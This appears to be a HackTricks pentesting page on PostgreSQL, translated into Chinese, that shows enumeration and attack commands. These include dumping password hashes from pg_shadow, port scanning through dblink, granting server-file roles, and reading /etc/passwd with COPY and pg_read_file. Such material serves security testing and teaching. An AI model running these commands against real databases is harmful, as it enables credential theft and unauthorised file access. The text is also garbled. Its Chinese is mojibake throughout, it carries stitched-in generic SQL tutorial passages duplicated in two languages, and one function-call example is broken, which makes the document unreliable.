# 5432,5433 - æ¸—é€æµ‹è¯•Postgresql

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œè‡ªåŠ¨åŒ–ç”±å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## **åŸºæœ¬ä¿¡æ¯**

**PostgreSQL**æ˜¯ä¸€ä¸ªå¼€æºçš„é¢å‘å¯¹è±¡çš„å…³ç³»å‹æ•°æ®åº“ç³»ç»Ÿï¼Œä½¿ç”¨å¹¶æ‰©å±•äº†SQLè¯­è¨€ã€‚

**é»˜è®¤ç«¯å£ï¼š**5432ï¼Œå¦‚æœæ­¤ç«¯å£å·²è¢«ä½¿ç”¨ï¼ŒPostgreSQLä¼¼ä¹ä¼šä½¿ç”¨ä¸‹ä¸€ä¸ªæœªä½¿ç”¨çš„ç«¯å£ï¼ˆå¯èƒ½æ˜¯5433ï¼‰ã€‚
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## è¿æ¥å’ŒåŸºæœ¬æšä¸¾

### Connect to PostgreSQL

### è¿æ¥åˆ°PostgreSQL

To connect to a PostgreSQL database, you can use the `psql` command-line tool or any PostgreSQL client application. The `psql` tool is commonly used and comes pre-installed with most PostgreSQL installations.

è¦è¿æ¥åˆ°PostgreSQLæ•°æ®åº“ï¼Œå¯ä»¥ä½¿ç”¨`psql`å‘½ä»¤è¡Œå·¥å…·æˆ–ä»»ä½•PostgreSQLå®¢æˆ·ç«¯åº”ç”¨ç¨‹åºã€‚`psql`å·¥å…·é€šå¸¸è¢«å¹¿æ³›ä½¿ç”¨ï¼Œå¹¶ä¸”åœ¨å¤§å¤šæ•°PostgreSQLå®‰è£…ä¸­é¢„å…ˆå®‰è£…ã€‚

To connect to a PostgreSQL database using `psql`, use the following command:

ä½¿ç”¨`psql`è¿æ¥åˆ°PostgreSQLæ•°æ®åº“ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```bash
psql -h <host> -p <port> -U <username> -d <database>
```

Replace `<host>` with the hostname or IP address of the PostgreSQL server, `<port>` with the port number (default is 5432), `<username>` with the username, and `<database>` with the name of the database you want to connect to.

å°†`<host>`æ›¿æ¢ä¸ºPostgreSQLæœåŠ¡å™¨çš„ä¸»æœºåæˆ–IPåœ°å€ï¼Œ`<port>`æ›¿æ¢ä¸ºç«¯å£å·ï¼ˆé»˜è®¤ä¸º5432ï¼‰ï¼Œ`<username>`æ›¿æ¢ä¸ºç”¨æˆ·åï¼Œ`<database>`æ›¿æ¢ä¸ºè¦è¿æ¥çš„æ•°æ®åº“çš„åç§°ã€‚

### Basic Enumeration

### åŸºæœ¬æšä¸¾

Once connected to a PostgreSQL database, you can perform basic enumeration to gather information about the database and its objects.

ä¸€æ—¦è¿æ¥åˆ°PostgreSQLæ•°æ®åº“ï¼Œå¯ä»¥æ‰§è¡ŒåŸºæœ¬æšä¸¾ä»¥æ”¶é›†æœ‰å…³æ•°æ®åº“åŠå…¶å¯¹è±¡çš„ä¿¡æ¯ã€‚

#### List Databases

#### åˆ—å‡ºæ•°æ®åº“

To list all the databases in the PostgreSQL server, use the following command:

è¦åˆ—å‡ºPostgreSQLæœåŠ¡å™¨ä¸­çš„æ‰€æœ‰æ•°æ®åº“ï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```sql
\l
```

This command will display a list of databases along with their owner, size, and other details.

æ­¤å‘½ä»¤å°†æ˜¾ç¤ºæ•°æ®åº“åˆ—è¡¨ä»¥åŠå…¶æ‰€æœ‰è€…ã€å¤§å°å’Œå…¶ä»–è¯¦ç»†ä¿¡æ¯ã€‚

#### List Tables

#### åˆ—å‡ºè¡¨

To list all the tables in a specific database, use the following command:

è¦åˆ—å‡ºç‰¹å®šæ•°æ®åº“ä¸­çš„æ‰€æœ‰è¡¨ï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```sql
\dt
```

This command will display a list of tables along with their schema and owner.

æ­¤å‘½ä»¤å°†æ˜¾ç¤ºè¡¨åˆ—è¡¨ä»¥åŠå…¶æ¨¡å¼å’Œæ‰€æœ‰è€…ã€‚

#### Describe Table

#### æè¿°è¡¨

To describe the structure of a specific table, use the following command:

è¦æè¿°ç‰¹å®šè¡¨çš„ç»“æ„ï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š

```sql
\d <table_name>
```

Replace `<table_name>` with the name of the table you want to describe.

å°†`<table_name>`æ›¿æ¢ä¸ºè¦æè¿°çš„è¡¨çš„åç§°ã€‚

This command will display the columns, data types, constraints, and other details of the table.

æ­¤å‘½ä»¤å°†æ˜¾ç¤ºè¡¨çš„åˆ—ã€æ•°æ®ç±»å‹ã€çº¦æŸå’Œå…¶ä»–è¯¦ç»†ä¿¡æ¯ã€‚
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
{% hint style="warning" %}
å¦‚æœè¿è¡Œ **`\list`** å‘½ä»¤ï¼Œä½ å‘ç°ä¸€ä¸ªåä¸º **`rdsadmin`** çš„æ•°æ®åº“ï¼Œé‚£ä¹ˆä½ å°±çŸ¥é“ä½ åœ¨ä¸€ä¸ª **AWS postgresql æ•°æ®åº“** ä¸­ã€‚
{% endhint %}

æœ‰å…³**å¦‚ä½•æ»¥ç”¨ PostgreSQL æ•°æ®åº“**çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/" %}
[postgresql-injection](../pentesting-web/sql-injection/postgresql-injection/)
{% endcontent-ref %}

## è‡ªåŠ¨æšä¸¾
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**æš´åŠ›ç ´è§£**](../generic-methodologies-and-resources/brute-force.md#postgresql)

### **ç«¯å£æ‰«æ**

æ ¹æ®[**è¿™é¡¹ç ”ç©¶**](https://www.exploit-db.com/papers/13084)ï¼Œå½“è¿æ¥å°è¯•å¤±è´¥æ—¶ï¼Œ`dblink`ä¼šæŠ›å‡ºä¸€ä¸ª`sqlclient_unable_to_establish_sqlconnection`å¼‚å¸¸ï¼Œå…¶ä¸­åŒ…å«é”™è¯¯çš„è§£é‡Šã€‚ä»¥ä¸‹æ˜¯è¿™äº›è¯¦ç»†ä¿¡æ¯çš„ç¤ºä¾‹ã€‚
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
* ä¸»æœºä¸å¯ç”¨

`è¯¦ç»†ä¿¡æ¯ï¼šæ— æ³•è¿æ¥åˆ°æœåŠ¡å™¨ï¼šæ— æ³•åˆ°è¾¾ä¸»æœºã€‚æœåŠ¡å™¨æ˜¯å¦åœ¨ä¸»æœºâ€œ1.2.3.4â€ä¸Šè¿è¡Œï¼Œå¹¶æ¥å—ç«¯å£5678çš„TCP/IPè¿æ¥ï¼Ÿ`

* ç«¯å£å·²å…³é—­
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
* ç«¯å£æ˜¯å¼€æ”¾çš„
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
æˆ–è€…
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
* ç«¯å£æ˜¯å¼€æ”¾çš„æˆ–è¢«è¿‡æ»¤çš„
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
å¾ˆé—æ†¾ï¼Œåœ¨PL/pgSQLå‡½æ•°ä¸­ä¼¼ä¹æ²¡æœ‰åŠæ³•è·å–å¼‚å¸¸çš„è¯¦ç»†ä¿¡æ¯ã€‚ä½†æ˜¯å¦‚æœå¯ä»¥ç›´æ¥è¿æ¥åˆ°PostgreSQLæœåŠ¡å™¨ï¼Œå°±å¯ä»¥è·å–è¯¦ç»†ä¿¡æ¯ã€‚å¦‚æœæ— æ³•ç›´æ¥ä»ç³»ç»Ÿè¡¨ä¸­è·å–ç”¨æˆ·åå’Œå¯†ç ï¼Œå‰ä¸€èŠ‚ä¸­æè¿°çš„å­—å…¸æ”»å‡»å¯èƒ½ä¼šæˆåŠŸã€‚

## ç‰¹æƒæšä¸¾

### è§’è‰²

| è§’è‰²ç±»å‹       |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | è§’è‰²å…·æœ‰è¶…çº§ç”¨æˆ·ç‰¹æƒ                                                                                                                                  |
| rolinherit     | è§’è‰²è‡ªåŠ¨ç»§æ‰¿å…¶æ‰€å±è§’è‰²çš„ç‰¹æƒ                                                                                                                        |
| rolcreaterole  | è§’è‰²å¯ä»¥åˆ›å»ºæ›´å¤šè§’è‰²                                                                                                                                  |
| rolcreatedb    | è§’è‰²å¯ä»¥åˆ›å»ºæ•°æ®åº“                                                                                                                                    |
| rolcanlogin    | è§’è‰²å¯ä»¥ç™»å½•ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¯¥è§’è‰²å¯ä»¥ä½œä¸ºåˆå§‹ä¼šè¯æˆæƒæ ‡è¯†ç¬¦                                                                                              |
| rolreplication | è§’è‰²æ˜¯å¤åˆ¶è§’è‰²ã€‚å¤åˆ¶è§’è‰²å¯ä»¥å¯åŠ¨å¤åˆ¶è¿æ¥å¹¶åˆ›å»ºå’Œåˆ é™¤å¤åˆ¶æ§½ã€‚                                                                                          |
| rolconnlimit   | å¯¹äºå¯ä»¥ç™»å½•çš„è§’è‰²ï¼Œè®¾ç½®è¯¥è§’è‰²å¯ä»¥å»ºç«‹çš„å¹¶å‘è¿æ¥çš„æœ€å¤§æ•°é‡ã€‚-1è¡¨ç¤ºæ— é™åˆ¶ã€‚                                                                              |
| rolpassword    | ä¸æ˜¯å¯†ç ï¼ˆå§‹ç»ˆæ˜¾ç¤ºä¸º`********`ï¼‰                                                                                                                     |
| rolvaliduntil  | å¯†ç è¿‡æœŸæ—¶é—´ï¼ˆä»…ç”¨äºå¯†ç èº«ä»½éªŒè¯ï¼‰ï¼›å¦‚æœæ²¡æœ‰è¿‡æœŸï¼Œåˆ™ä¸ºnull                                                                                             |
| rolbypassrls   | è§’è‰²ç»•è¿‡æ¯ä¸ªè¡Œçº§å®‰å…¨ç­–ç•¥ï¼Œè¯·å‚é˜…[ç¬¬5.8èŠ‚](https://www.postgresql.org/docs/current/ddl-rowsecurity.html)äº†è§£æ›´å¤šä¿¡æ¯ã€‚                              |
| rolconfig      | è¿è¡Œæ—¶é…ç½®å˜é‡çš„è§’è‰²ç‰¹å®šé»˜è®¤å€¼                                                                                                                        |
| oid            | è§’è‰²çš„ID                                                                                                                                             |

#### æœ‰è¶£çš„ç»„

* å¦‚æœæ‚¨æ˜¯**`pg_execute_server_program`**çš„æˆå‘˜ï¼Œæ‚¨å¯ä»¥**æ‰§è¡Œ**ç¨‹åº
* å¦‚æœæ‚¨æ˜¯**`pg_read_server_files`**çš„æˆå‘˜ï¼Œæ‚¨å¯ä»¥**è¯»å–**æ–‡ä»¶
* å¦‚æœæ‚¨æ˜¯**`pg_write_server_files`**çš„æˆå‘˜ï¼Œæ‚¨å¯ä»¥**å†™å…¥**æ–‡ä»¶

{% hint style="info" %}
è¯·æ³¨æ„ï¼Œåœ¨Postgresä¸­ï¼Œ**ç”¨æˆ·**ã€**ç»„**å’Œ**è§’è‰²**æ˜¯**ç›¸åŒçš„**ã€‚è¿™åªå–å†³äºæ‚¨å¦‚ä½•ä½¿ç”¨å®ƒå’Œæ˜¯å¦å…è®¸å…¶ç™»å½•ã€‚
{% endhint %}
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### è¡¨æ ¼

In PostgreSQL, a table is a collection of related data organized in rows and columns. Each table has a name and consists of one or more columns, which define the data types and constraints for the data stored in the table. Tables are used to store and organize data in a structured manner.

åœ¨PostgreSQLä¸­ï¼Œè¡¨æ ¼æ˜¯ä»¥è¡Œå’Œåˆ—ç»„ç»‡çš„ç›¸å…³æ•°æ®çš„é›†åˆã€‚æ¯ä¸ªè¡¨æ ¼éƒ½æœ‰ä¸€ä¸ªåç§°ï¼Œå¹¶ç”±ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—ç»„æˆï¼Œè¿™äº›åˆ—å®šä¹‰äº†å­˜å‚¨åœ¨è¡¨æ ¼ä¸­çš„æ•°æ®çš„æ•°æ®ç±»å‹å’Œçº¦æŸã€‚è¡¨æ ¼ç”¨äºä»¥ç»“æ„åŒ–çš„æ–¹å¼å­˜å‚¨å’Œç»„ç»‡æ•°æ®ã€‚

To create a table in PostgreSQL, you can use the `CREATE TABLE` statement followed by the table name and the column definitions. For example:

è¦åœ¨PostgreSQLä¸­åˆ›å»ºä¸€ä¸ªè¡¨æ ¼ï¼Œå¯ä»¥ä½¿ç”¨`CREATE TABLE`è¯­å¥ï¼Œåè·Ÿè¡¨æ ¼åç§°å’Œåˆ—å®šä¹‰ã€‚ä¾‹å¦‚ï¼š

```sql
CREATE TABLE employees (
    id SERIAL PRIMARY KEY,
    name VARCHAR(100),
    age INTEGER,
    salary DECIMAL(10, 2)
);
```

This creates a table named `employees` with four columns: `id`, `name`, `age`, and `salary`. The `id` column is defined as a `SERIAL` data type, which automatically generates a unique value for each row. The `name` column is defined as a `VARCHAR` data type with a maximum length of 100 characters. The `age` column is defined as an `INTEGER` data type, and the `salary` column is defined as a `DECIMAL` data type with a precision of 10 and a scale of 2.

è¿™å°†åˆ›å»ºä¸€ä¸ªåä¸º`employees`çš„è¡¨æ ¼ï¼ŒåŒ…å«å››ä¸ªåˆ—ï¼š`id`ã€`name`ã€`age`å’Œ`salary`ã€‚`id`åˆ—è¢«å®šä¹‰ä¸º`SERIAL`æ•°æ®ç±»å‹ï¼Œå®ƒä¼šè‡ªåŠ¨ç”Ÿæˆæ¯è¡Œçš„å”¯ä¸€å€¼ã€‚`name`åˆ—è¢«å®šä¹‰ä¸º`VARCHAR`æ•°æ®ç±»å‹ï¼Œæœ€å¤§é•¿åº¦ä¸º100ä¸ªå­—ç¬¦ã€‚`age`åˆ—è¢«å®šä¹‰ä¸º`INTEGER`æ•°æ®ç±»å‹ï¼Œ`salary`åˆ—è¢«å®šä¹‰ä¸º`DECIMAL`æ•°æ®ç±»å‹ï¼Œç²¾åº¦ä¸º10ï¼Œå°æ•°ä½æ•°ä¸º2ã€‚

Once a table is created, you can insert data into it using the `INSERT INTO` statement. For example:

åˆ›å»ºè¡¨æ ¼åï¼Œå¯ä»¥ä½¿ç”¨`INSERT INTO`è¯­å¥å°†æ•°æ®æ’å…¥å…¶ä¸­ã€‚ä¾‹å¦‚ï¼š

```sql
INSERT INTO employees (name, age, salary)
VALUES ('John Doe', 30, 5000.00);
```

This inserts a new row into the `employees` table with the specified values for the `name`, `age`, and `salary` columns.

è¿™å°†åœ¨`employees`è¡¨æ ¼ä¸­æ’å…¥ä¸€è¡Œæ–°æ•°æ®ï¼Œè¯¥è¡Œçš„`name`ã€`age`å’Œ`salary`åˆ—å…·æœ‰æŒ‡å®šçš„å€¼ã€‚

To retrieve data from a table, you can use the `SELECT` statement. For example:

è¦ä»è¡¨æ ¼ä¸­æ£€ç´¢æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨`SELECT`è¯­å¥ã€‚ä¾‹å¦‚ï¼š

```sql
SELECT * FROM employees;
```

This retrieves all rows and columns from the `employees` table.

è¿™å°†ä»`employees`è¡¨æ ¼ä¸­æ£€ç´¢æ‰€æœ‰è¡Œå’Œåˆ—ã€‚

Tables in PostgreSQL can also have constraints, such as primary keys, foreign keys, unique constraints, and check constraints, which enforce data integrity and consistency. These constraints can be defined when creating the table or added later using the `ALTER TABLE` statement.

PostgreSQLä¸­çš„è¡¨æ ¼è¿˜å¯ä»¥å…·æœ‰çº¦æŸï¼Œä¾‹å¦‚ä¸»é”®ã€å¤–é”®ã€å”¯ä¸€çº¦æŸå’Œæ£€æŸ¥çº¦æŸï¼Œç”¨äºå¼ºåˆ¶æ•°æ®çš„å®Œæ•´æ€§å’Œä¸€è‡´æ€§ã€‚è¿™äº›çº¦æŸå¯ä»¥åœ¨åˆ›å»ºè¡¨æ ¼æ—¶å®šä¹‰ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨`ALTER TABLE`è¯­å¥åæœŸæ·»åŠ ã€‚

In addition to creating tables, PostgreSQL also provides various commands and functions for managing tables, such as `ALTER TABLE` for modifying table structure, `DROP TABLE` for deleting tables, and `TRUNCATE TABLE` for removing all data from a table.

é™¤äº†åˆ›å»ºè¡¨æ ¼ï¼ŒPostgreSQLè¿˜æä¾›äº†å„ç§ç”¨äºç®¡ç†è¡¨æ ¼çš„å‘½ä»¤å’Œå‡½æ•°ï¼Œä¾‹å¦‚ç”¨äºä¿®æ”¹è¡¨æ ¼ç»“æ„çš„`ALTER TABLE`ï¼Œç”¨äºåˆ é™¤è¡¨æ ¼çš„`DROP TABLE`ï¼Œä»¥åŠç”¨äºä»è¡¨æ ¼ä¸­åˆ é™¤æ‰€æœ‰æ•°æ®çš„`TRUNCATE TABLE`ã€‚
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### å‡½æ•°

Functions in PostgreSQL are named blocks of code that can be executed by calling their name. They are used to perform specific tasks and can accept parameters and return values.

åœ¨PostgreSQLä¸­ï¼Œå‡½æ•°æ˜¯ä¸€ç»„å‘½åçš„ä»£ç å—ï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨å®ƒä»¬çš„åç§°æ¥æ‰§è¡Œã€‚å®ƒä»¬ç”¨äºæ‰§è¡Œç‰¹å®šçš„ä»»åŠ¡ï¼Œå¹¶å¯ä»¥æ¥å—å‚æ•°å’Œè¿”å›å€¼ã€‚

To create a function, you need to use the `CREATE FUNCTION` statement followed by the function name, input parameters (if any), return type, and the code block enclosed in `BEGIN` and `END`.

è¦åˆ›å»ºä¸€ä¸ªå‡½æ•°ï¼Œæ‚¨éœ€è¦ä½¿ç”¨`CREATE FUNCTION`è¯­å¥ï¼Œåé¢è·Ÿç€å‡½æ•°åç§°ã€è¾“å…¥å‚æ•°ï¼ˆå¦‚æœæœ‰ï¼‰ã€è¿”å›ç±»å‹ä»¥åŠç”¨`BEGIN`å’Œ`END`æ‹¬èµ·æ¥çš„ä»£ç å—ã€‚

Here is an example of a simple function that calculates the square of a number:

ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•å‡½æ•°çš„ç¤ºä¾‹ï¼Œç”¨äºè®¡ç®—ä¸€ä¸ªæ•°çš„å¹³æ–¹ï¼š

```sql
CREATE FUNCTION square(num INTEGER) RETURNS INTEGER AS $$
BEGIN
    RETURN num * num;
END;
$$ LANGUAGE plpgsql;
```

In this example, the function is named `square` and it accepts an integer parameter `num`. It returns the square of the input number.

åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå‡½æ•°åä¸º`square`ï¼Œå®ƒæ¥å—ä¸€ä¸ªæ•´æ•°å‚æ•°`num`ï¼Œå¹¶è¿”å›è¾“å…¥æ•°å­—çš„å¹³æ–¹ã€‚

To call a function, you simply use its name followed by the input parameter values enclosed in parentheses.

è¦è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œåªéœ€ä½¿ç”¨å‡½æ•°åï¼Œåé¢è·Ÿç€ç”¨æ‹¬å·æ‹¬èµ·æ¥çš„è¾“å…¥å‚æ•°å€¼ã€‚

```sql
SELECT square(5);
```

This will return the value `25`, which is the square of `5`.

è¿™å°†è¿”å›å€¼`25`ï¼Œå³`5`çš„å¹³æ–¹ã€‚

Functions can also have output parameters, which allow them to return multiple values. To define an output parameter, you need to specify the `OUT` keyword before the parameter name.

å‡½æ•°è¿˜å¯ä»¥å…·æœ‰è¾“å‡ºå‚æ•°ï¼Œå…è®¸å®ƒä»¬è¿”å›å¤šä¸ªå€¼ã€‚è¦å®šä¹‰ä¸€ä¸ªè¾“å‡ºå‚æ•°ï¼Œæ‚¨éœ€è¦åœ¨å‚æ•°åç§°ä¹‹å‰æŒ‡å®š`OUT`å…³é”®å­—ã€‚

Here is an example of a function that calculates both the square and cube of a number:

ä»¥ä¸‹æ˜¯ä¸€ä¸ªè®¡ç®—ä¸€ä¸ªæ•°çš„å¹³æ–¹å’Œç«‹æ–¹çš„å‡½æ•°çš„ç¤ºä¾‹ï¼š

```sql
CREATE FUNCTION square_and_cube(num INTEGER, OUT square_result INTEGER, OUT cube_result INTEGER) AS $$
BEGIN
    square_result := num * num;
    cube_result := num * num * num;
END;
$$ LANGUAGE plpgsql;
```

In this example, the function is named `square_and_cube` and it accepts an integer parameter `num`. It has two output parameters `square_result` and `cube_result`, which will store the square and cube of the input number, respectively.

åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå‡½æ•°åä¸º`square_and_cube`ï¼Œå®ƒæ¥å—ä¸€ä¸ªæ•´æ•°å‚æ•°`num`ã€‚å®ƒæœ‰ä¸¤ä¸ªè¾“å‡ºå‚æ•°`square_result`å’Œ`cube_result`ï¼Œåˆ†åˆ«å­˜å‚¨è¾“å…¥æ•°å­—çš„å¹³æ–¹å’Œç«‹æ–¹ã€‚

To call this function and retrieve the output parameters, you need to use the `SELECT` statement and assign the output parameters to variables.

è¦è°ƒç”¨è¿™ä¸ªå‡½æ•°å¹¶æ£€ç´¢è¾“å‡ºå‚æ•°ï¼Œæ‚¨éœ€è¦ä½¿ç”¨`SELECT`è¯­å¥ï¼Œå¹¶å°†è¾“å‡ºå‚æ•°èµ‹å€¼ç»™å˜é‡ã€‚

```sql
SELECT square_and_cube(3, square_result, cube_result);
```

This will return a single row with the values `9` and `27`, which are the square and cube of `3`, respectively.

è¿™å°†è¿”å›ä¸€ä¸ªåŒ…å«å€¼`9`å’Œ`27`çš„å•è¡Œï¼Œåˆ†åˆ«æ˜¯`3`çš„å¹³æ–¹å’Œç«‹æ–¹ã€‚
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## æ–‡ä»¶ç³»ç»Ÿæ“ä½œ

### è¯»å–ç›®å½•å’Œæ–‡ä»¶

ä»è¿™ä¸ª[**æäº¤**](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a)ä¸­ï¼Œå®šä¹‰çš„**`DEFAULT_ROLE_READ_SERVER_FILES`**ç»„çš„æˆå‘˜ï¼ˆç§°ä¸º**`pg_read_server_files`**ï¼‰å’Œ**è¶…çº§ç”¨æˆ·**å¯ä»¥åœ¨ä»»ä½•è·¯å¾„ä¸Šä½¿ç”¨**`COPY`**æ–¹æ³•ï¼ˆæŸ¥çœ‹`genfile.c`ä¸­çš„`convert_and_check_filename`ï¼‰ï¼š
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
{% hint style="warning" %}
è¯·è®°ä½ï¼Œå¦‚æœæ‚¨ä¸æ˜¯è¶…çº§ç”¨æˆ·ä½†å…·æœ‰**CREATEROLE**æƒé™ï¼Œæ‚¨å¯ä»¥**å°†è‡ªå·±æ·»åŠ åˆ°è¯¥ç»„ä¸­ï¼š**
```sql
GRANT pg_read_server_files TO username;
```
[**æ›´å¤šä¿¡æ¯**](pentesting-postgresql.md#privilege-escalation-with-createrole)
{% endhint %}

è¿˜æœ‰ä¸€äº›**å…¶ä»–çš„postgreså‡½æ•°**å¯ä»¥ç”¨æ¥**è¯»å–æ–‡ä»¶æˆ–åˆ—å‡ºç›®å½•**ã€‚åªæœ‰**è¶…çº§ç”¨æˆ·**å’Œ**å…·æœ‰æ˜¾å¼æƒé™çš„ç”¨æˆ·**å¯ä»¥ä½¿ç”¨å®ƒä»¬ï¼š
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
æ‚¨å¯ä»¥åœ¨[https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)ä¸­æ‰¾åˆ°**æ›´å¤šå‡½æ•°**ã€‚

